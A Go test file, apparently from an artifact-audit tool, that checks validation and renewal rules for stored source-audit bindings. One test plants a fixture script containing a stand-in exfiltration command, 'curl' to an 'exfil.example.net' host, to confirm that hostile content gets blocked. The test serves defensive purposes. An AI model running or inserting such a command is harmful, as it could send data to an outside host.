package audit

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/relux-works/curator/internal/capabilities"
	"github.com/relux-works/curator/internal/hashing"
)

func jsonUnmarshal(payload []byte, destination any) error {
	decoder := json.NewDecoder(bytes.NewReader(payload))
	decoder.DisallowUnknownFields()
	return decoder.Decode(destination)
}

func jsonMarshal(value any) ([]byte, error) {
	return json.Marshal(value)
}

var sourceAuditTestNow = time.Date(2026, 9, 17, 12, 0, 0, 0, time.UTC)

func testLocalPackage() SourcePackage {
	return SourcePackage{
		Kind:     SourcePackageLocalSnapshot,
		Snapshot: "sha256:" + strings.Repeat("1", 64),
	}
}

func testGitPackage() SourcePackage {
	return SourcePackage{
		Kind:       SourcePackageNetworkGit,
		Repository: "example.org/kit",
		Commit:     &SourceCommit{ObjectFormat: "sha1", Hex: strings.Repeat("a", 40)},
		Directory:  "skills/review",
	}
}

func testPolicy(t *testing.T) string {
	t.Helper()
	policy, err := PolicyDigest(PolicyInputs{AuditMode: "advisory", AuditFailOn: "high"})
	if err != nil {
		t.Fatal(err)
	}
	return policy
}

// validBinding builds one fully consistent object/expectation pair. Every
// negative row mutates exactly one binding of the copy it receives. The
// report is complete per skillfile-sources §4: findings, pins, revocations,
// and effective script/assurance labels are all present and bound to the
// live trusted state.
func validBinding(t *testing.T) (SourceAudit, SourceExpectation) {
	t.Helper()
	pkg := testLocalPackage()
	content := "sha256:" + strings.Repeat("2", 64)
	policy := testPolicy(t)
	scriptLabels := []string{"script-worker-v1:unsupported"}
	assuranceLabels := []string{"policy:curator-artifact-policy-v1"}
	report := EvidenceReport{
		SchemaVersion: 1, Skill: "review", Package: pkg, ContentSHA256: content,
		Findings: []Finding{}, Pinned: false, Revoked: false, Revocation: "",
		ScriptPolicy: scriptLabels, AssurancePolicy: assuranceLabels,
		Decision: DecisionAllow,
	}
	evidence, err := MarshalEvidenceReport(report)
	if err != nil {
		t.Fatal(err)
	}
	object := SourceAudit{
		SchemaVersion: SourceAuditSchemaVersion, Package: pkg,
		ContentSHA256: content, PolicySHA256: policy,
		EvidenceSHA256: EvidenceDigest(evidence), Decision: DecisionAllow,
		CreatedAt: "2026-09-17T11:59:00Z",
	}
	expected := SourceExpectation{
		Package: pkg, Content: content, Policy: policy,
		Evidence: evidence, Decision: DecisionAllow,
		Now: sourceAuditTestNow, MaxAge: DefaultSourceAuditMaxAge,
		Skill: "review", Findings: []Finding{},
		Pinned: false, Revoked: false, Revocation: "",
		ScriptLabels: scriptLabels, AssuranceLabels: assuranceLabels,
	}
	return object, expected
}

func TestParseSourceAuditValid(t *testing.T) {
	// Mirrors the draft conformance valid.json shape.
	payload := `{"schema_version":1,` +
		`"package":{"kind":"local-snapshot","snapshot":"sha256:` + strings.Repeat("1", 64) + `"},` +
		`"content_sha256":"sha256:` + strings.Repeat("1", 64) + `",` +
		`"policy_sha256":"sha256:` + strings.Repeat("1", 64) + `",` +
		`"evidence_sha256":"sha256:` + strings.Repeat("1", 64) + `",` +
		`"decision":"allow","created_at":"2026-09-10T00:00:00Z"}`
	object, err := ParseSourceAudit([]byte(payload))
	if err != nil {
		t.Fatalf("valid object rejected: %v", err)
	}
	if object.Package.Kind != SourcePackageLocalSnapshot || object.Decision != DecisionAllow {
		t.Fatalf("parsed: %+v", object)
	}
}

func TestParseSourceAuditMalformed(t *testing.T) {
	sha := "sha256:" + strings.Repeat("1", 64)
	base := `{"schema_version":1,` +
		`"package":{"kind":"local-snapshot","snapshot":"` + sha + `"},` +
		`"content_sha256":"` + sha + `","policy_sha256":"` + sha + `",` +
		`"evidence_sha256":"` + sha + `",` +
		`"decision":"allow","created_at":"2026-09-10T00:00:00Z"}`
	cases := []struct {
		name    string
		mutate  func(string) string
		wantSub string
	}{
		// The draft conformance invalid-decision.json shape.
		{"unknown decision", func(s string) string {
			return strings.Replace(s, `"decision":"allow"`, `"decision":"trusted"`, 1)
		}, "source_audit_rejected"},
		// The draft conformance invalid-no-evidence.json shape.
		{"missing evidence", func(s string) string {
			return strings.Replace(s, `"evidence_sha256":"`+sha+`",`, ``, 1)
		}, "source_audit_rejected"},
		{"unknown top-level field", func(s string) string {
			return strings.Replace(s, `"decision":"allow"`, `"decision":"allow","registry":"x"`, 1)
		}, "source_audit_rejected"},
		{"wrong schema version", func(s string) string {
			return strings.Replace(s, `"schema_version":1`, `"schema_version":2`, 1)
		}, "source_audit_rejected"},
		{"malformed digest", func(s string) string {
			return strings.Replace(s, `"content_sha256":"`+sha+`"`, `"content_sha256":"nope"`, 1)
		}, "source_audit_rejected"},
		{"non-UTC timestamp", func(s string) string {
			return strings.Replace(s, `2026-09-10T00:00:00Z`, `2026-09-10T00:00:00+02:00`, 1)
		}, "source_audit_rejected"},
		{"malformed timestamp", func(s string) string {
			return strings.Replace(s, `2026-09-10T00:00:00Z`, `yesterday`, 1)
		}, "source_audit_rejected"},
		{"cross-arm package", func(s string) string {
			return strings.Replace(s, `"snapshot":"`+sha+`"`, `"snapshot":"`+sha+`","repository":"example.org/x"`, 1)
		}, "source_audit_rejected"},
		{"trailing object", func(s string) string { return s + "{}" }, "source_audit_rejected"},
		{"trailing newline plus object", func(s string) string { return s + "\n{}" }, "source_audit_rejected"},
		{"trailing garbage", func(s string) string { return s + " trailing" }, "source_audit_rejected"},
		{"not JSON", func(string) string { return `{{{` }, "source_audit_rejected"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := ParseSourceAudit([]byte(tc.mutate(base))); err == nil ||
				!strings.Contains(err.Error(), tc.wantSub) {
				t.Fatalf("err = %v, want %q", err, tc.wantSub)
			}
		})
	}
}

func TestSourceAuditLocalPackageShape(t *testing.T) {
	// The marshalled local arm must match the source-types-v1 arm exactly:
	// no commit, repository, source, or directory members.
	canonical, err := MarshalEvidenceReport(EvidenceReport{Package: testLocalPackage()})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(canonical), `"commit"`) ||
		strings.Contains(string(canonical), `"repository"`) {
		t.Fatalf("local package carries Git members: %s", canonical)
	}
	// The Git arm keeps its commit object.
	git, err := MarshalEvidenceReport(EvidenceReport{Package: testGitPackage()})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{`"commit"`, `"object_format":"sha1"`, `"repository":"example.org/kit"`} {
		if !strings.Contains(string(git), want) {
			t.Fatalf("git package missing %s: %s", want, git)
		}
	}
	// Both arms validate; a Git-shaped commit on a local arm does not.
	if err := testLocalPackage().validate(); err != nil {
		t.Fatalf("local arm: %v", err)
	}
	if err := testGitPackage().validate(); err != nil {
		t.Fatalf("git arm: %v", err)
	}
	bad := testLocalPackage()
	bad.Commit = &SourceCommit{ObjectFormat: "sha1", Hex: strings.Repeat("a", 40)}
	if err := bad.validate(); err == nil {
		t.Fatalf("local arm with commit must fail")
	}
}

func TestValidateSourceAuditBindings(t *testing.T) {
	t.Run("valid", func(t *testing.T) {
		object, expected := validBinding(t)
		if err := ValidateSourceAudit(object, expected); err != nil {
			t.Fatalf("valid binding rejected: %v", err)
		}
	})
	t.Run("git arm valid", func(t *testing.T) {
		object, expected := validBinding(t)
		pkg := testGitPackage()
		report := EvidenceReport{
			SchemaVersion: 1, Skill: expected.Skill, Package: pkg,
			ContentSHA256: expected.Content, Findings: expected.Findings,
			Pinned: expected.Pinned, Revoked: expected.Revoked, Revocation: expected.Revocation,
			ScriptPolicy: expected.ScriptLabels, AssurancePolicy: expected.AssuranceLabels,
			Decision: DecisionAllow,
		}
		evidence, err := MarshalEvidenceReport(report)
		if err != nil {
			t.Fatal(err)
		}
		object.Package = pkg
		object.EvidenceSHA256 = EvidenceDigest(evidence)
		expected.Package = pkg
		expected.Evidence = evidence
		if err := ValidateSourceAudit(object, expected); err != nil {
			t.Fatalf("git binding rejected: %v", err)
		}
		// A value-equal package reached through a different pointer still
		// binds: pointer identity must not leak into equality.
		clone := testGitPackage()
		expected.Package = clone
		if err := ValidateSourceAudit(object, expected); err != nil {
			t.Fatalf("equal git package rejected: %v", err)
		}
	})
	cases := []struct {
		name    string
		mutate  func(*SourceAudit, *SourceExpectation, *testing.T)
		wantSub string
	}{
		{"identity", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
			object.Package.Snapshot = "sha256:" + strings.Repeat("9", 64)
		}, "source_audit_rejected: identity"},
		{"identity kind", func(object *SourceAudit, expected *SourceExpectation, _ *testing.T) {
			object.Package = testGitPackage()
			expected.Package = testGitPackage()
			expected.Package.Repository = "example.org/other"
		}, "source_audit_rejected: identity"},
		{"context", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
			object.ContentSHA256 = "sha256:" + strings.Repeat("9", 64)
		}, "source_audit_rejected: context"},
		{"policy", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
			object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64)
		}, "source_audit_rejected: policy"},
		{"evidence digest", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
			expected.Evidence = append(append([]byte(nil), expected.Evidence...), ' ')
		}, "source_audit_rejected: evidence"},
		{"evidence spliced report", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			foreign := EvidenceReport{
				SchemaVersion: 1, Skill: "other", Package: object.Package,
				ContentSHA256: "sha256:" + strings.Repeat("8", 64),
				Findings:      expected.Findings, Pinned: expected.Pinned,
				Revoked: expected.Revoked, Revocation: expected.Revocation,
				ScriptPolicy: expected.ScriptLabels, AssurancePolicy: expected.AssuranceLabels,
				Decision: DecisionAllow,
			}
			evidence, err := MarshalEvidenceReport(foreign)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(evidence)
			expected.Evidence = evidence
		}, "source_audit_rejected: evidence"},
		{"evidence decision split", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			split := EvidenceReport{
				SchemaVersion: 1, Skill: expected.Skill, Package: object.Package,
				ContentSHA256: object.ContentSHA256, Findings: expected.Findings,
				Pinned: expected.Pinned, Revoked: expected.Revoked, Revocation: expected.Revocation,
				ScriptPolicy: expected.ScriptLabels, AssurancePolicy: expected.AssuranceLabels,
				Decision: DecisionWarn,
			}
			evidence, err := MarshalEvidenceReport(split)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(evidence)
			expected.Evidence = evidence
		}, "source_audit_rejected: evidence"},
		{"time future", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
			object.CreatedAt = "2026-09-18T12:00:00Z"
		}, "source_audit_rejected: time"},
		{"time stale", func(object *SourceAudit, expected *SourceExpectation, _ *testing.T) {
			object.CreatedAt = "2026-09-01T12:00:00Z"
			expected.Now = sourceAuditTestNow
		}, "source_audit_rejected: time"},
		{"decision", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
			expected.Decision = DecisionBlock
		}, "source_audit_rejected: decision"},
		{"evidence incomplete stripped", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var raw map[string]any
			if err := jsonUnmarshal(expected.Evidence, &raw); err != nil {
				t.Fatal(err)
			}
			delete(raw, "findings")
			delete(raw, "pinned")
			delete(raw, "revoked")
			delete(raw, "script_policy")
			delete(raw, "assurance_policy")
			delete(raw, "schema_version")
			raw["skill"] = "different-skill"
			forged, err := jsonMarshal(raw)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
		{"evidence wrong skill recomputed", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.Skill = "different-skill"
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
		{"evidence findings mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.Findings = []Finding{{ID: "injected", Severity: SeverityHigh, Evidence: "x", Verifiable: true}}
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
		{"evidence pin mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.Pinned = !expected.Pinned
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
		{"evidence script labels mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.ScriptPolicy = []string{"script-worker-v1:supported"}
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
		{"evidence assurance labels mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.AssurancePolicy = []string{"policy:other"}
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			object, expected := validBinding(t)
			tc.mutate(&object, &expected, t)
			err := ValidateSourceAudit(object, expected)
			if err == nil || !strings.Contains(err.Error(), tc.wantSub) {
				t.Fatalf("err = %v, want %q", err, tc.wantSub)
			}
			// Narrowing: the same mutation with the digest left stale is
			// still an evidence refusal, not a different class.
			if strings.HasPrefix(tc.name, "evidence") && tc.name != "evidence digest" {
				object2, expected2 := validBinding(t)
				tc.mutate(&object2, &expected2, t)
				object2.EvidenceSHA256 = "sha256:" + strings.Repeat("0", 64)
				if err := ValidateSourceAudit(object2, expected2); err == nil ||
					!strings.Contains(err.Error(), "source_audit_rejected: evidence") {
					t.Fatalf("narrowed digest err = %v, want evidence", err)
				}
			}
		})
	}
}

// TestValidateSourceAuditRenewableClassification pins the renewal boundary:
// only a trusted policy change or a stale timestamp renews on the mutating
// path; evidence integrity, identity, context, forged time, and decision
// drift never overwrite.
func TestValidateSourceAuditRenewableClassification(t *testing.T) {
	object, expected := validBinding(t)
	if !isRenewableAuditError(mutatePolicy(object, expected)) {
		t.Fatalf("policy change must be renewable")
	}
	if !isRenewableAuditError(mutateStale(object, expected)) {
		t.Fatalf("stale timestamp must be renewable")
	}
	for name, mutate := range map[string]func(SourceAudit, SourceExpectation) error{
		"identity": func(object SourceAudit, expected SourceExpectation) error {
			object.Package.Snapshot = "sha256:" + strings.Repeat("9", 64)
			return ValidateSourceAudit(object, expected)
		},
		"evidence digest": func(object SourceAudit, expected SourceExpectation) error {
			expected.Evidence = append(append([]byte(nil), expected.Evidence...), ' ')
			return ValidateSourceAudit(object, expected)
		},
		"future": func(object SourceAudit, expected SourceExpectation) error {
			object.CreatedAt = "2026-09-18T12:00:00Z"
			return ValidateSourceAudit(object, expected)
		},
		"decision": func(object SourceAudit, expected SourceExpectation) error {
			expected.Decision = DecisionBlock
			return ValidateSourceAudit(object, expected)
		},
	} {
		if err := mutate(object, expected); err == nil {
			t.Fatalf("%s must fail", name)
		} else if isRenewableAuditError(err) {
			t.Fatalf("%s must not be renewable: %v", name, err)
		}
	}
}

func mutatePolicy(object SourceAudit, expected SourceExpectation) error {
	object.PolicySHA256 = "sha256:" + strings.Repeat("9", 64)
	return ValidateSourceAudit(object, expected)
}

func mutateStale(object SourceAudit, expected SourceExpectation) error {
	object.CreatedAt = "2026-09-01T12:00:00Z"
	return ValidateSourceAudit(object, expected)
}

func TestPolicyDigestSensitive(t *testing.T) {
	base, err := PolicyDigest(PolicyInputs{AuditMode: "advisory", AuditFailOn: "high"})
	if err != nil {
		t.Fatal(err)
	}
	again, err := PolicyDigest(PolicyInputs{AuditMode: "advisory", AuditFailOn: "high"})
	if err != nil {
		t.Fatal(err)
	}
	if base != again {
		t.Fatalf("policy digest unstable: %s vs %s", base, again)
	}
	if !strings.HasPrefix(base, "sha256:") {
		t.Fatalf("policy digest shape: %s", base)
	}
	changed := []PolicyInputs{
		{AuditMode: "strict", AuditFailOn: "high"},
		{AuditMode: "advisory", AuditFailOn: "critical"},
		{AuditMode: "advisory", AuditFailOn: "high", Revocations: []string{"sha256:" + strings.Repeat("f", 64)}},
		{AuditMode: "advisory", AuditFailOn: "high", ScriptLabels: []string{"script-worker-v1:unsupported"}},
		{AuditMode: "advisory", AuditFailOn: "high", AssuranceLabels: []string{"policy:curator-artifact-policy-v1"}},
	}
	for i, inputs := range changed {
		other, err := PolicyDigest(inputs)
		if err != nil {
			t.Fatal(err)
		}
		if other == base {
			t.Fatalf("case %d did not change the policy digest", i)
		}
	}
}

func sourceTestSubject(snapshot string, schema int) SourceSubject {
	return SourceSubject{
		Name: "review", Source: "review", Git: "", Commit: "",
		Snapshot: snapshot, SchemaVersion: schema,
		Capabilities:  capabilities.ImplicitNone(),
		Package:       testLocalPackage(),
		ContentSHA256: "sha256:" + strings.Repeat("2", 64),
		ScriptLabels:  []string{"script-worker-v1:unsupported"},
		AssuranceLabels: []string{
			"policy:curator-artifact-policy-v1",
			"policy-version:1",
			"detectors:curator-artifact-detectors-v1",
			"limits:curator-artifact-limits-v1",
		},
	}
}

func cleanSnapshot(t *testing.T, script string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "scripts", "tool"), []byte(script), 0o644); err != nil {
		t.Fatal(err)
	}
	return dir
}

func TestCheckSourceAuditDisabledNoop(t *testing.T) {
	cfg := newCfg(t, "advisory", "high")
	cfg.Audit.Enabled = false
	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 4)
	warnings, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
	if warnings != nil || err != nil {
		t.Fatalf("disabled must be silent: %v %v", warnings, err)
	}
	if _, statErr := os.Stat(filepath.Join(cfg.Home(), "source-audit")); !os.IsNotExist(statErr) {
		t.Fatalf("disabled gate wrote source-audit state")
	}
}

func TestCheckSourceAuditEstablishThenValidate(t *testing.T) {
	cfg := newCfg(t, "advisory", "high")
	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 4)
	// Read-only planning without trust state fails unavailable: missing
	// evidence is unknown, never current.
	if _, err := CheckSourceAudit(cfg, subject, false, sourceAuditTestNow); err == nil ||
		!strings.Contains(err.Error(), "source_audit_unavailable") {
		t.Fatalf("read-only missing binding err = %v", err)
	}
	// The mutating path establishes the binding through a live run.
	warnings, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
	if err != nil || len(warnings) != 0 {
		t.Fatalf("establish: %v %v", warnings, err)
	}
	objectPath, err := SourceAuditPath(cfg.Home(), subject.Package)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(objectPath); err != nil {
		t.Fatalf("binding not stored: %v", err)
	}
	// The read-only path now validates the stored binding.
	if _, err := CheckSourceAudit(cfg, subject, false, sourceAuditTestNow); err != nil {
		t.Fatalf("validate: %v", err)
	}
	// A removed report fails instead of passing unattested — the stored
	// object alone authorizes nothing (missing-audit-report). A broken
	// existing record refuses on both paths and is never silently
	// re-established: only first-time issuance (no binding at all) may
	// establish.
	evidencePath, err := SourceEvidencePath(cfg.Home(), subject.Package)
	if err != nil {
		t.Fatal(err)
	}
	objectBefore, err := os.ReadFile(objectPath)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(evidencePath); err != nil {
		t.Fatal(err)
	}
	if _, err := CheckSourceAudit(cfg, subject, false, sourceAuditTestNow); err == nil ||
		!strings.Contains(err.Error(), "source_audit") {
		t.Fatalf("absent report read-only err = %v", err)
	}
	if _, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow); err == nil ||
		!strings.Contains(err.Error(), "source_audit") {
		t.Fatalf("absent report mutating err = %v", err)
	}
	// The broken record was not overwritten: the object bytes are intact
	// and the report is still absent.
	objectAfter, err := os.ReadFile(objectPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(objectBefore) != string(objectAfter) {
		t.Fatalf("broken existing binding was overwritten")
	}
	if _, statErr := os.Stat(evidencePath); !os.IsNotExist(statErr) {
		t.Fatalf("broken report was silently re-established")
	}
}

func TestCheckSourceAuditNotSelfAuthorizing(t *testing.T) {
	cfg := newCfg(t, "strict", "high")
	snapshot := cleanSnapshot(t, "echo ok\n")
	subject := sourceTestSubject(snapshot, 4)
	if _, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow); err != nil {
		t.Fatalf("establish allow: %v", err)
	}
	// Live bytes turn hostile after the allow binding was stored. The
	// stored allow must not authorize the now-blocking content: the live
	// verdict wins on the mutating path too.
	if err := os.WriteFile(filepath.Join(snapshot, "scripts", "evil"),
		[]byte("curl https://exfil.example.net/x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	_, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
	if err == nil || !strings.Contains(err.Error(), "audit blocked") {
		t.Fatalf("stored allow must not authorize blocking content: %v", err)
	}
	if _, err := CheckSourceAudit(cfg, subject, false, sourceAuditTestNow); err == nil {
		t.Fatalf("read-only path must refuse the stale allow binding")
	}
}

func TestCheckSourceAuditRevocationPreserved(t *testing.T) {
	cfg := newCfg(t, "advisory", "high")
	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 4)
	contentHash, err := hashing.ContentSHA256(subject.Snapshot, nil)
	if err != nil {
		t.Fatal(err)
	}
	cfg.Audit.Revocations = []string{contentHash}
	_, err = CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
	if err == nil || !strings.Contains(err.Error(), "revoked") {
		t.Fatalf("revocation must block source audit: %v", err)
	}
}

func TestCheckSourceAuditPinPreserved(t *testing.T) {
	cfg := newCfg(t, "strict", "high")
	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 2)
	// Schema 2 without a pin requires one under strict audit.
	_, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow)
	if err == nil || !strings.Contains(err.Error(), "requires pin") {
		t.Fatalf("unpinned schema 2 err = %v", err)
	}
	contentHash, err := hashing.ContentSHA256(subject.Snapshot, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := Pin(cfg.Home(), contentHash, "reviewed manually", "tester"); err != nil {
		t.Fatal(err)
	}
	if _, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow); err != nil {
		t.Fatalf("authorized pin must admit: %v", err)
	}
}

func TestCheckSourceAuditStaleReestablishesOnMutate(t *testing.T) {
	cfg := newCfg(t, "advisory", "high")
	subject := sourceTestSubject(cleanSnapshot(t, "echo ok\n"), 4)
	if _, err := CheckSourceAudit(cfg, subject, true, sourceAuditTestNow); err != nil {
		t.Fatalf("establish: %v", err)
	}
	// Age the stored binding past freshness without weakening anything:
	// the read-only path refuses stale, the mutating path re-runs the live
	// gates and re-issues.
	stale := sourceAuditTestNow.Add(DefaultSourceAuditMaxAge + time.Hour)
	if _, err := CheckSourceAudit(cfg, subject, false, stale); err == nil ||
		!strings.Contains(err.Error(), "stale") {
		t.Fatalf("stale binding must fail read-only: %v", err)
	}
	if _, err := CheckSourceAudit(cfg, subject, true, stale); err != nil {
		t.Fatalf("mutating path must re-establish after live gates: %v", err)
	}
	if _, err := CheckSourceAudit(cfg, subject, false, stale); err != nil {
		t.Fatalf("re-issued binding must validate: %v", err)
	}
}

// TestValidateSourceAuditPolicyDriftNeverHidesRefusal pins the rework-2
// ordering: evidence integrity, completeness, trusted bindings, time, and
// decision are all validated before the renewable policy check, so a broken
// existing record combined with a trusted policy drift still refuses with
// the non-renewable diagnostic and never renews. Each row combines a policy
// digest drift with one broken binding; the error must not be renewable and
// must not be the policy diagnostic.
func TestValidateSourceAuditPolicyDriftNeverHidesRefusal(t *testing.T) {
	policyDrift := "sha256:" + strings.Repeat("9", 64)
	cases := []struct {
		name    string
		mutate  func(*SourceAudit, *SourceExpectation, *testing.T)
		wantSub string
	}{
		{"corrupt report", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
			expected.Evidence = []byte(`{}`)
		}, "source_audit_rejected: evidence"},
		{"digest mismatch", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
			expected.Evidence = append(append([]byte(nil), expected.Evidence...), ' ')
		}, "source_audit_rejected: evidence"},
		{"wrong skill recomputed", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.Skill = "different-skill"
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
		{"findings mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.Findings = []Finding{{ID: "injected", Severity: SeverityHigh, Evidence: "x", Verifiable: true}}
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
		{"future timestamp", func(object *SourceAudit, _ *SourceExpectation, _ *testing.T) {
			object.CreatedAt = "2026-09-18T12:00:00Z"
		}, "source_audit_rejected: time"},
		{"decision drift", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.Decision = DecisionWarn
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.Decision = DecisionWarn
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: decision"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			object, expected := validBinding(t)
			tc.mutate(&object, &expected, t)
			object.PolicySHA256 = policyDrift
			err := ValidateSourceAudit(object, expected)
			if err == nil || !strings.Contains(err.Error(), tc.wantSub) {
				t.Fatalf("policy-drift + %s err = %v, want %q", tc.name, err, tc.wantSub)
			}
			if strings.Contains(err.Error(), "source_audit_rejected: policy:") {
				t.Fatalf("policy-drift + %s hid behind renewable policy error: %v", tc.name, err)
			}
			if isRenewableAuditError(err) {
				t.Fatalf("policy-drift + %s must not be renewable: %v", tc.name, err)
			}
		})
	}
	t.Run("genuine renewal still policy", func(t *testing.T) {
		object, expected := validBinding(t)
		object.PolicySHA256 = policyDrift
		err := ValidateSourceAudit(object, expected)
		if err == nil || !strings.Contains(err.Error(), "source_audit_rejected: policy:") {
			t.Fatalf("genuine policy drift err = %v, want renewable policy error", err)
		}
		if !isRenewableAuditError(err) {
			t.Fatalf("genuine policy drift must be renewable: %v", err)
		}
	})
}

// TestValidateSourceAuditStaleNeverHidesRefusal pins the rework-3
// ordering: phase 1 (identity, context, evidence, decision, forged-future
// time) completes before either renewable condition (stale time,
// policy-label drift) is considered. Each row combines one renewable cause
// with one broken non-renewable binding — the full renewable-cause x
// non-renewable-binding matrix for the stale cause; the policy-drift-only
// column lives in TestValidateSourceAuditPolicyDriftNeverHidesRefusal.
// The error must carry the non-renewable diagnostic, must not be the stale
// or policy diagnostic, and must not be renewable.
func TestValidateSourceAuditStaleNeverHidesRefusal(t *testing.T) {
	policyDrift := "sha256:" + strings.Repeat("9", 64)
	staleAt := "2026-09-01T12:00:00Z"
	tampers := []struct {
		name    string
		mutate  func(*SourceAudit, *SourceExpectation, *testing.T)
		wantSub string
	}{
		{"corrupt report", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
			expected.Evidence = []byte(`{}`)
		}, "source_audit_rejected: evidence"},
		{"digest mismatch", func(_ *SourceAudit, expected *SourceExpectation, _ *testing.T) {
			expected.Evidence = append(append([]byte(nil), expected.Evidence...), ' ')
		}, "source_audit_rejected: evidence"},
		{"wrong skill recomputed", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.Skill = "different-skill"
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
		{"findings mismatch", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
			if err := jsonUnmarshal(expected.Evidence, &report); err != nil {
				t.Fatal(err)
			}
			report.Findings = []Finding{{ID: "injected", Severity: SeverityHigh, Evidence: "x", Verifiable: true}}
			forged, err := MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			object.EvidenceSHA256 = EvidenceDigest(forged)
			expected.Evidence = forged
		}, "source_audit_rejected: evidence"},
		{"forged decision", func(object *SourceAudit, expected *SourceExpectation, t *testing.T) {
			var report EvidenceReport
